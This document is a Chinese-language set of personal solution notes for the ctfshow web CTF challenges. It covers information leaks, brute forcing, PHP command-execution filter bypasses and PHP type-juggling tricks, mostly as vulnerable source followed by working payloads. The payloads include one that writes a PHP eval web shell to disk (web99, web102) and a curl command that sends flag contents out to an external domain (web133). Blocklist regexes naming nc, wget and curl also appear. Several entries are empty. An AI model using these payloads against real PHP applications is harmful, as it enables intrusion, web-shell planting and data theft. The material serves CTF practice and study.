		ctfshow--web--信息收集



web1

查看源代码



web2

查看页面源代码的四种方法
1.鼠标右击看到”查看源代码
2.使用快捷Ctrl+U来查看源码
3.网页地址栏前面加上入view-source:
4.F12



web3

bp抓包



web4

robots.txt



web5

phps（phps其实就是php的源代码文件，index.phps）



web6

www.zip



web7

.git（.git文件泄露）



web8

.svn	（SVN是Subversion的简称，是一个开放源代码的版本控制系统，与git类似）
	（.svn目录下还包含了以.svn-base结尾的源代码文件副本）
       	（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录）



web9

Vim缓存（index.php.swp）



web10

F12（查看cookie）



web11

域名TXT记录泄露（一般指为某个主机名或域名设置的说明，阿里云网站运维检测平台：https://zijian.aliyun.com/）



web12

网站中的敏感信息（电话，邮箱）



web13

内部技术文档泄露（超链接）



web14

编辑器配置不当（/editor）



web15

密码逻辑脆弱



web16

探针泄露（php探针是用来探测空间、服务器运行状况和PHP信息用的）
	      （雅黑PHP探针：/tz.php）



web17

.sql（.sql文件是mysql数据库导出的备份文件，例：/backup.sql）



web18

.js（javascript是一种程序语言，主要用于网页的特效、功能的脚本编程）



web19

前端密钥泄露



web20

.mdb（mdb文件是早期asp+access构架的数据库文件，例：/db/db.mdb）










		ctfshow--web--爆破（BP）



web21

BP Intruder payload（Payload Options 设置字典，Payload Processing 添加规则）



web22

爆破子域名



web23

爆破MD5值



web24（mt_srand()、mt_rand()）

源码：
if(isset($_GET['r'])){
	$r = $_GET['r'];
	mt_srand(372619038);					# 播种函数mt_srand()，与srand()类似
	if(intval($r)===intval(mt_rand())){		# mt_rand()可以生成随机整数，与rand()相同，但比rand()速度快四倍
		echo $flag;
	}
}

###
通过这个函数mt_srand()来设定一个种子seed 再通过mt_rand()来结合种子按照一定的规则得到一个随机数，这是一个线性的计算，每次请求得到的随机数都是不一样的，但是只要种子一样，得到的随机数都是像一个一次函数一样变化的，就像y=ax=b，x就是请求的次数，a和b就是由种子决定（mt_rand()请求了一次，（mt_rand()+mt_rand()）为请求两次，不是两倍的mt_rand()）
###

写一个PHP就可以得到一个与网站相同的数r（伪随机数）
<?php
mt_srand(372619038);
echo intval(mt_rand());
?>



web25

源码：
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(hexdec(substr(md5($flag), 0,8)));
    $rand = intval($r)-intval(mt_rand());				# 第一次
    if((!$rand)){
        if($_COOKIE['token']==(mt_rand()+mt_rand())){	# 第二三次
            echo $flag;
        }
    }else{
        echo $rand;
    }
}

###
要求 $read = 0 ，所以要使intval($r) = intval(mt_rand()) ，需要使用pho_mt_seed逆推种子
###

pho_mt_seed：https://github.com/openwall/php_mt_seed.git（使用方法：make（第一次使用）；./pho_mt_seed 随机数）



web26

源码：
<script>
	function check(){					# 定义函数
		$.ajax({						# AJAX 发送 POST 请求到 'checkdb.php'
		url:'checkdb.php',
		type:'POST',
		dataType:'json',				# 期望服务器返回的数据是 JSON 格式
		data:{
			'a':$('#a').val(),			# 从页面获取 id 为 'a' 的元素的值，并作为 'a' 参数发送
			'p':$('#p').val(),
			'd':$('#d').val(),
			'u':$('#u').val(),
			'pass':$('#pass').val()
		},
		success:function(data){		# 请求成功时执行以下代码
			alert(data['msg']);
		},
		error:function(data){			# 请求失败时执行以下代码
			alert(data['msg']);
		}
	});
}
</script>

payload：在checkdb.php页面POST a=&p=&d=&u=&pass=



web27

BP爆破身份证生日



web28

BP爆破数字型目录











ctfshow--web--命令执行		（核心函数：eval($_GET['c'])；）
	基础知识：	通配符 	?（一个字符）、*（一个或多个字符）、[]（匹配[]内任意字符）、[^]（匹配[]外的字符）

				变量		a=fl；b=ag；echo $a$b		（输出flag）

				&	表示在后台运行							（redis-server &）
				&&	前一条命令执行成功，才执行下一条		（rm 1.txt && echo 'yes'）
				|	管道，作为下一条命令参数				（ls | grep flag）
				||	前一条命令执行失败，才执行下一条		（cat flag.txt || echo 'fail'）

				空格替换：${IFS}	$IFS$9	%09		<		（%09 为 TAB，`<` 不能与通配符连用，否则会没有结果）

				截断符号：$	;	|	-	(	)	`	||	&&	&	}	{	%0a

				cat命令代替：	cat:由第一行开始显示内容，并将所有内容输出
							tac:从最后一行倒序显示内容，并将所有内容输出
							more:根据窗口大小，一页一页的现实文件内容
							less:和more类似，但其优点可以往前翻页，而且进行可以搜索字符
							head:只显示头几行
							tail:只显示最后几行
							nl:类似于cat -n，显示时输出行号
							tailf:类似于tail -f
							sort%20/flag 读文件

				php会把传过来的参数进行处理后再存储到GET或者POST这种数组中
					1）删除初始空格
					2）把某些字符转换为下划线	（`.`，` `，`[`，等）

	绕过方法：	反斜杠绕过		（ca\t fl\ag.txt）
				编码绕过			（`echo 'Y2F0Cg==' | base64 -d`  flag.txt）
				拼接绕过			（a=c;b=at;c=f;d=lag;e=.txt;$a$b ${c}${d}${e}）
				单双引号绕过		（c'a't  test、c"a"t  test）
				通配符绕过		（cat  t?st、cat  te*、cat  t[a-z]st、cat  t{a,b,c,d,e,f}st）

	文件包含：	show_source("flag.php");		highlight_file('flag.php');	require('/flag.txt');		require_once('/flag.txt');

	目录查看：	var_dump(scandir('/'))		print_r(scandir('/'))	DirectoryIterator类（$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}）

	函数绕过：	打印当初路径下文件的函数:print_r(scandir('.'))，其中`.`被过滤利用函数传参绕过

				localeconv() 返回一包含本地数字及货币格式信息的数组 -> print_r(scandir(localeconv()[0]))			（不能用[]）
					1.current() 函数返回数组中的当前元素（单元）,默认取第一个值，
					2.pos() 同 current() ,是current()的别名
					3.reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE		(以上三个都可以)

				payload:
					c=print_r(scandir(pos(localeconv())));	(Array([0] => . [1] => .. [2] => flag.php [3] => index.php))

				next()			输出数组中的当前元素的下一个元素的值,也就是可以输出第二个
				end()			输出最后一个
				array_reverse()	将数组转置
				show_source()	显示源代码
				exit()			退出

				payload:
					c=print_r(next(array_reverse(scandir(pos(localeconv())))));		(flag.php)
					c=show_source(next(array_reverse(scandir(pos(localeconv())))));

	查看文件内容：1、cat flag.php	2、a=fl;b=ag;cat $a$b.php	3、cat `ls`	4、cp flag.php 1.txt	5、cat [b-h][j-m][1-z][e-h].*		6、`cp fla?.??? 1.txt`；
					system('');			system('');						system('');			system('');
				 7、include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php	8、data://text/plain,<?php system('tac fla?.php');?>
							eval('');																	include('');




web29

源码：过滤了flag

payload：
	c=system('cat fl?g.php');



web30

源码：过滤了system以及php

payload：
	c=`cp fla?.??? 1.txt`;		（eval不可行，且需要有目录写入权限）

	c=include('flag.p*');



web31

源码：对c过滤了cat,sort,shell，`.`，` `，`'`，`"`

payload:
	c=eval($_GET[1]);&1=system('cat flag.php');		（利用只检查c的特性绕过）



web32

源码：过滤了`()`以及`;`

payload:
	c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php			（%0a换行符；include函数不用括号 分号可以用?>代替）



web33

源码：过滤了`()`、`;`、`"`

payload:
	c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



web34

源码：过滤了`()`、`;`、`"`、`:`

payload:
	c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



web35

源码：过滤了`()`、`;`、`"`、`:`、`<`

payload:
	c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



web36

源码：过滤了`()`、`;`、`"`、`:`、[0-9]

payload:
	c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



web37

源码：include($c);

payload:
	c=data://text/plain,<?php system('tac fla?.php');?>



web38

源码：include($c);		过滤了php

payload:
	c=data://text/plain,<?=system('tac fla?.???')?>



web39

源码：include($c.php);

payload:
	c=data://text/plain,<?=system('tac fla?.???')?>



web40

源码：只能用分号，下划线，以及英文括号		（打印当初路径下文件的函数:print_r(scandir('.'))，其中`.`被过滤利用函数传参绕过）

localeconv() 返回一包含本地数字及货币格式信息的数组 -> print_r(scandir(localeconv()[0]))			（不能用[]）
1.current() 函数返回数组中的当前元素（单元）,默认取第一个值，
2.pos() 同 current() ,是current()的别名
3.reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE		(以上三个都可以)

payload:
	c=print_r(scandir(pos(localeconv())));	(Array([0] => . [1] => .. [2] => flag.php [3] => index.php))

next()			输出数组中的当前元素的下一个元素的值,也就是可以输出第二个
end()			输出最后一个
array_reverse()	将数组转置
show_source()	显示源代码

payload:
	c=print_r(next(array_reverse(scandir(pos(localeconv())))));		(flag.php)
	c=show_source(next(array_reverse(scandir(pos(localeconv())))));



web41



web42

源码：system($c >/dev/null 2>&1)；			(>/dev/null 2>&1 把输出的内容不进行回显)

payload:
	c=ls;		(用；截断)
	c=tac flag.php;



web43

源码：system($c >/dev/null 2>&1)；			（过滤了；与 cat）

payload:						(用 || 截断)
	c=tac flag.php||
	c=nl flag.php||			(给文件中的每一行添加行号并输出内容)
	c=cp flag.php 1.txt||



web44

源码：system($c >/dev/null 2>&1);			(过滤了flag)

payload:
	c=tac fl*.php||



web45

源码：system($c >/dev/null 2>&1);			(过滤了flag、空格)

payload:
	c=tac%09fl*.php||						(%09是 TAB 的 url 编码)



web46

源码：system($c >/dev/null 2>&1);			(过滤了cat、flag、空格、数字、$、*)

payload:
	c=tac%09fla%27%27g.php||



web47

源码：system($c >/dev/null 2>&1);			(过滤了分号、flag、空格、数字、$、*、more、less、head、sort、tail)

payload:
	c=tac%09fla?.???||



web48

payload:
	c=tac%09fla?.???||



web49

payload:
	c=tac%09fla?.???||



web50

源码：system($c >/dev/null 2>&1);			(过滤了分号、cat、flag、空格、数字、$、*、more、less、head、sort、tail、sed、cut、awk、strings、od、curl、`、%、%09、&)

payload:
	c=tac<fla\g.php||



web51

源码：system($c >/dev/null 2>&1);			(过滤了分号、cat、flag、空格、数字、$、*、more、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、`、%、%09、&)

payload:
	c=nl<fla\g.php||



web52

源码：system($c >/dev/null 2>&1);			(过滤了分号、cat、flag、空格、数字、*、more、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、`、%、%09、&（编码后为%26）、<、>)

payload:
	c=nl${IFS}fla\g.php||



web53

源码：system($c);			(过滤了分号、cat、flag、空格、数字、*、more、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、`、%、%09、&（编码后为%26）、<、>)

payload:
	c=nl${IFS}fla?.???



web54

payload:
	c=/bin/??t${IFS}????.???



web55

源码：过滤了a-z 、`、%、%09(tab)、%26(&)、<、>

payload：
	c=/???/????64 ????.???				(c=/bin/base64 flag.php)



web56
web57



web58

payload:
	c=show_source("flag.php");
	c=highlight_file('flag.php');



web59
web60
web61
web62
web63
web64
web65



web66

源码：过滤了system

payload:
	c=print_r(scandir('/'));
	c=highlight_file('/flag.txt');



web67



web68

payload:
	c=var_dump(scandir('/'));
	c=include('/flag.txt');



web69
web70



web71

源码：
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();						# 得到缓冲区的数据
        ob_end_clean();								# 清除缓冲区的内容，并将缓冲区关闭（不会输出内容）
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);			# 将数字及小写字母替换成?
}else{
    highlight_file(__FILE__);
}
 
?>

payload:
	c=include('/flag.txt');exit();						(提前退出绕过后面代码)



web72

源码：
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();						# 得到缓冲区的数据
        ob_end_clean();								# 清除缓冲区的内容，并将缓冲区关闭（不会输出内容）
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);			# 将数字及小写字母替换成?
}else{
    highlight_file(__FILE__);
}
 
?>

payload:
	c=?><?php $a=new DirectoryIterator("glob://./*");	# glob://伪协议读取当前目录
foreach($a as $f)
{echo($f->__toString().' ');								# 输出当前目录
}
exit(0);												# 提前退出
?>

	CVE-2017-11362		(PHP 7.1.0 到 PHP 7.1.7 中的一种 Use-After-Free 漏洞)



web73

payload:
	c=?><?php $a=new DirectoryIterator("glob://./*");	# glob://伪协议读取当前目录
foreach($a as $f)
{echo($f->__toString().' ');								# 输出当前目录
}
exit(0);												# 提前退出
?>

	c=include('/flagc.txt');exit();



web74

payload:
	c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit();
	c=$a=new DirectoryIterator("/");foreach($a as $key=>$value){echo $key."=>".$value;}exit();
	c=include('/flagx.txt');exit();



web75

payload:
	c=
try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
 
    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
        echo ($row[0]) . "|";
    }
    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
    exit(0);
}
exit(0);



web76



web77

payload:
	c=$ffi = FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);



web118










ctfshow--web--文件包含



web78










ctfshow--web--php特性

		is_numeric()		（版本要求：PHP 4, PHP 5, PHP 7）
	绕过：如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE。is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后
	?what=1'
	?what=1"
	?what=1,
	?what=1%00
	?what=1%20
	...




web89

源码：
<?php
include("flag.php");
highlight_file(__FILE__);
 
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){		# preg_match无法处理数组
        die("no no no!");
    }
    if(intval($num)){						# intval() 函数获取变量的整数值
        echo $flag;
    }
} 

payload:
	num[]=1							# 数组绕过



web90

源码：
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}

payload:
	num=4476a
	num=0x117c						# 16进制



web91

源码:
<?php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){		# /m表示多行匹配,/i表示不区分大小写
    if(preg_match('/^php$/i', $a)){		
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}

payload:
	cmd=%0aphp					# %0a 为换行



web92

源码：强类型变成了弱类型比较,4476a就不能用了,但仍可以用十六进制绕过

payload:
	num=0x117c



web93

源码：
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}

payload:
	num=010574						# 以0开头表示8进制
	num=4476.1						# 浮点数



web94

源码：
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){				# 检测开头是否为零
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}

payload:
	num=%0a010574
	num=%20010574
	num=4476.20



web95

源码：同上，且过滤了`.`

payload:
	num=%0a010574
	num=%20010574



web96

源码：
<?php
highlight_file(__FILE__);
if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}

payload:
	u=./flag.php



web97

源码：md5强类型比较

payload:
	a[]=1&b[]=2
	a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 	//过滤数组时可以用md5碰撞绕过



web98

源码：
<?php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
?>

payload:
	GET:a=1 					# 为了触发POST传参GET传任意值都可
	POST:HTTP_FLAG=flag 		# GET=POST，因此POST传参，即实现$_GET['HTTP_FLAG']=='flag'



web99

源码：
<?php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));						# 向$allow中插入一个随机值
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){		# in_array(seach,array,type) 这里并没有第三个参数type,因此存在漏洞,就可以形成自动转换，即n=1.php会自动转换为1
    file_put_contents($_GET['n'], $_POST['content']);
}
?>

payload:
	GET:n=1.php
	POST:content=<?php @eval($_POST[a]);?>



web100

源码：
<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);	# and和or的优先级低于"="所以v0的值取决于v1
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }  
}
?> 

payload:
	v1=1&v2=echo new ReflectionClass&v3=;
	非预期:
	v1=1&v2=var_dump($ctfshow)/*&v3=*/;
	v1=1&v2=?><?php echo `cat ctfshow.php`?>/*&v3=*/;
	v1=1&v2=system('cat ctfshow.php')&v3=-2;
	v1=1&v2=echo&v3=;system('cat ctfshow.php');



web101



web102

源码：
<?php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);		# v4为1的条件是v2为数字（php5的环境中，是可以识别十六进制的）
if($v4){
    $s = substr($v2,2);							# 截取前面两个字符
    $str = call_user_func($v1,$s);					# $s作为 $v1 函数的参数执行 
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
?>

payload:
	get:v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&v3=1.php
	post:v1=hex2bin
					# php5

$a='<?=`cat *`;';
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的。
输出   5044383959474e6864434171594473
带e的话会被认为是科学计数法，可以通过is_numeric检测。
	get:v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
	post: v1=hex2bin
					# php7



web103
web104
web105
web106
web107



web108

源码：ereg函数；ereg($pattern, $str, $matches)	(%00截断及遇到%00则默认为字符串的结束)

payload:
	c=a%00778



web109

源码：
<?php
 
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");					# 通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果（如果存在返回）
    }
}
?>

payload：
	v1=Exception&v2=system('cat fl*') 
	v1=Reflectionclass&v2=system('cat fl*')
	v1=ReflectionMethod&v2=system('cat fl*')



web110

源码：同上		(用FilesystemIterator类)

payload:
	v1=FilesystemIterator&v2=getcwd			# getcwd函数获取当前目录第一个文件



web111

源码：PHP的超全局变量$GLOBALS

payload:
	v1=ctfshow&v2=GLOBALS



web112



web113

源码：过滤了filter，文件包含

payload:
	?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
	?file=compress.zlib://flag.php
								# /proc/self/root是指向根目录的



web114

源码：过滤了root和compress，文件包含

payload:
	file=php://filter/resource=flag.php



web115

源码：
<?php
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){			# trim()函数会移除字符串两侧的空白字符或其他预定义字符
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
}?>

爆破：
<?php
for ($i=0; $i <=128 ; $i++) { 
    $x=chr($i).'1';
   if(trim($x)!=='1' &&  is_numeric($x)){
        echo urlencode(chr($i))."\n";
   }
}
//%0C (换页符)

payload:
	num=%0c36



web116
.
web122



web123

源码：
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  					# 通过eval直接输出flag
         if($fl0g==="flag_give_me"){		# fl0g等于flag_give_me才能输出flag
             echo $flag;
         }
    }
}
?> 

payload:
	CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo implode(get_defined_vars())
				# implode() 将数组转换为字符串；get_defined_vars() 返回一个关联数组，其中包含了当前作用域中已定义的所有变量及其对应的值
				# PHP变量名应该只有数字字母下划线，若出现类似.字符会被转化为下划线，但有一个特殊字符[，它本身会变成下划线，而[后边的内容不会被转化即CTF[SHOW.COM =>CTF_SHOW.COM ！！！



web124



web125

源码：
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>

payload:
	CTF_SHOW=1&CTF[SHOW.COM=2&fun=extract($_POST)&fl0g=flag_give_me
				# extract($_POST) 将 $_POST 数组中的键值对转换为相应的变量名和变量值



web126

源码：

<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}

payload:
	a=1+fl0g=flag_give_me  								# GET
	CTF_SHOW=1&CTF[SHOW.COM=2&fun=parse_str($a[1])  	# POST
							# parse_str — 将字符串解析成多个变量



web127

源码：
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];
 
//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}
 
if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);						# 通过GET请求传递的参数提取到当前作用域中
}
if($ctf_show==='ilove36d'){
    echo $flag;
}

payload:
	?ctf show=ilove36d
				# 变量名中的点或空格会被转化为下划线



web128

源码：
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$f1 = $_GET['f1'];
$f2 = $_GET['f2'];
if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}
function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}

payload:
	f1=_&f2=get_defined_vars
							# 	gettext扩展
								gettext(“phpinfo”)等同于phpinfo()
								在开启该拓展后 _() 等效于 gettext()
								所以call_user_func(‘_’,‘phpinfo’) 返回的就是phpinfo



web129

源码：
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){			# 检查变量$f中是否包含子字符串'ctfshow'
        echo readfile($f);
    }
}?>

payload:
	f=php://filter/convert.base64.encode | ctfshow/resource=flag.php
	f=/ctfshow/../../var/www/html/flag.php



web130

源码：
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];
    if(preg_match('/.+?ctfshow/is', $f)){		# 将匹配从任意字符开始直到第一个出现的 "ctfshow" 为止
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
} 

payload:
	f=ctfshow



web131



web132

源码：
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];
    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        if($code == 'admin'){
            echo $flag;
        } 
    }
}

payload:
	code=admin&username=admin&password=1
				# &&的优先级高于||的优先级，所以只要username=admin为真值,code=admin输出flag



web133

源码：
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}

payload:
	F=`$F`; curl`cat flag.php|grep "flag"`.当时创建的域名 

	# 	get传参   F=`$F `;sleep 3
		经过substr($F,0,6)截取后 得到  `$F `;
		也就是会执行 eval("`$F `;");
		我们把原来的$F带进去
		eval("``$F `;sleep 3`");
		也就是说最终会执行  ``$F `;sleep 3` == shell_exec("`$F `;sleep 3");
		这样就在服务器上成功执行了 sleep 3



web134

源码：
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
} 

payload:
	?_POST[key1]=36d&_POST[key2]=36d		# POST数组的覆盖



web135

源码：
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
} 

payload:
	先将flag写入1.txt
	/?F=`$F`; cp flag.php 1.txt
	再访问1.txt
	/1.txt



web136

源码：
 <?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 

payload:
	?c=ls \|tee 1
	//将根目录下的内容写入1
	访问1，下载文件发现f149_15_h3r3
	?c=nl /f149_15_h3r3|tee 1
	访问1，下载文件得flag

	#	tee file1 file2 //复制文件
		ls|tee 1.txt //命令输出



web137






































































